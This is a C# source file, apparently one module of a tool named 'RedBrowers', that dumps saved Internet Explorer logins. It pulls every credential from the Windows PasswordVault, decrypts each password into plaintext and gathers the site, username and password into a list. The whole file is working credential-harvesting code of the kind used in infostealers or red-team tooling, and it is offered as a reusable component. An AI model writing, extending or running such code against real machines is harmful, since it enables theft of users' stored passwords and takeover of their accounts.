using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Windows.Security.Credentials;
namespace RedBrowers.Browsers
{
    internal class InternetExplorerLoginsReader : ILoginsReader
    {
    
        public  string BrowserName => "Internet Explorer";

        public List<Login> ReadLogins()
        {
            var logins = new List<Login>();
            foreach (PasswordCredential credential in new PasswordVault().RetrieveAll()) 
            {
                credential.RetrievePassword();
                logins.Add(new Login(credential.Resource,credential.UserName,credential.Password,BrowserName));
            }
            return logins;
        }

    }
}
